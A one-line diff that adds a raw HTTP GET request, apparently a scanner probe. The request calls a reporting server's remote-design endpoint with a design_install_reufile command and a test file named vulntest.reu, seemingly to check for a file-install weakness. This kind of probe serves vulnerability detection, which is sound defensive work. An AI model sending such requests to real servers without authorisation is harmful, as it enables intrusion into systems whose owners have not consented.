@@ -1,0 +1,1 @@
+GET /WebReport/ReportServer?op=fr_remote_design&cmd=design_install_reufile&reuFileName=vulntest.reu&isComplete=false HTTP/1.1
